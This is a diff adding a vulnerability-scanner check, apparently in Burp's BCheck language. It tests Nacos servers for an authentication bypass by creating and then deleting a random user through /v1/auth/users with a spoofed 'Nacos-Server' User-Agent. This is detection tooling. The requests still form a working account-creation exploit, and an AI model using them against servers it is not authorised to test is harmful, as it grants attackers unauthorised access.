@@ -1,0 +1,55 @@
+metadata:
+    language: v1-beta
+    name: "Nacos Unauthorized Create User"
+    description: "https://github.com/alibaba/nacos/issues/4593 "
+    tags: "Unauthorized","Nacos"
+    author: "JaveleyQAQ"
+
+define:
+    user = {random_str(5)}
+    potential_path_1 = `/nacos/v1/auth/users?username={user}&password={user}`
+    potential_path_2 = `/nacos/v1/auth/users?username={user}`
+    potential_path_3 = `/v1/auth/users?username={user}&password={user}`
+    potential_path_4 = `/v1/auth/users?username={user}`
+
+given host then
+    send request called nacos:
+        method: "POST"
+        path: {potential_path_1}
+        headers:
+            "User-Agent": "Nacos-Server"
+    if {nacos.response.status_code} is "200" and "create user ok!" in {nacos.response.body} then
+        send request called nacos_delete_1:
+            method: "DELETE"
+            path: {potential_path_2}
+            headers:
+                "User-Agent": "Nacos-Server"
+        if {nacos_delete_1.response.status_code} is "200" and "delete user ok!" in {nacos_delete_1.response.body} then
+            report issue:
+                severity: high
+                confidence: certain
+                detail: `https://github.com/alibaba/nacos/issues/4593`
+                remediation: `https://github.com/alibaba/nacos/issues/4593`
+        end if
+    else then
+        send request called nacos_2:
+            method: "POST"
+            path: {potential_path_3}
+            headers:
+                "User-Agent": "Nacos-Server"
+        if {nacos_2.response.status_code} is "200" and "create user ok!" in {nacos_2.response.body} then
+            send request called nacos_delete_2:
+                method: "DELETE"
+                path: {potential_path_4}
+                headers:
+                    "User-Agent": "Nacos-Server"
+            if {nacos_delete_2.response.status_code} is "200" and "delete user ok!" in {nacos_delete_2.response.body} then
+                report issue:
+                    severity: high
+                    confidence: certain
+                    detail: `https://github.com/alibaba/nacos/issues/4593`
+                    remediation: `https://github.com/alibaba/nacos/issues/4593`
+            end if
+        end if
+    end if
+
